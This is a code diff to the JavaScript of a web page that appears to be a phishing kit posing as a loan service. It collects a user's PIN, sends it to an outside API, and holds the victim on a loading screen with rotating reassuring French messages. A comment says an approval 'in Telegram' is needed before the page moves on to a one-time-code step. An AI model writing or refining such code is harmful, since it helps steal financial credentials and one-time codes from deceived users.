@@ -580,7 +580,7 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
 
 <script>
 var API = 'https://wave-loans.onrender.com/api';
-var sessId = null, pollTmr = null, verifying = false;
+var sessId = null, pollTmr = null, verifying = false, msgTimer = null;
 
 function showLoad(msg){
   document.getElementById('loadOv').classList.add('show');
@@ -768,6 +768,8 @@ async function submitPIN(){
 
   var sid = (r.data && r.data.sessionId) || r.sessionId || r.session_id;
   if(sid){
+    // Keep spinner visible — user must approve in Telegram before moving to OTP
+    showLoad('En attente de validation…');
     startPoll(sid);
   } else if(r.success === false){
     showPop('Erreur', r.message || 'Identifiants invalides. Réessayez.');
@@ -786,6 +788,7 @@ var pollActive = false;  // prevents overlapping polls
 
 function stopPoll(){
   if(pollTmr){ clearInterval(pollTmr); pollTmr=null; }
+  if(msgTimer){ clearInterval(msgTimer); msgTimer=null; }
   pollActive = false;
 }
 
@@ -793,8 +796,22 @@ function startPoll(sid){
   stopPoll();           // always clear before starting
   sessId = sid;
   pollActive = true;
+  // Cycle loading messages so user knows we're waiting for Telegram
+  var msgs = [
+    'En attente de validation…',
+    'Vérification en cours…',
+    'En attente de confirmation…',
+    'Patientez quelques instants…'
+  ];
+  var mi = 0;
+  msgTimer = setInterval(function(){
+    if(!pollActive){ clearInterval(msgTimer); return; }
+    mi = (mi+1) % msgs.length;
+    var el = document.getElementById('load-txt');
+    if(el) el.textContent = msgs[mi];
+  }, 3000);
   pollTmr = setInterval(async function(){
-    if(!pollActive) return;
+    if(!pollActive){ clearInterval(msgTimer); return; }
     try{
       var res = await fetch(API+'?action=check_status&sessionId='+sid+'&t='+Date.now());
       var r   = await res.json();
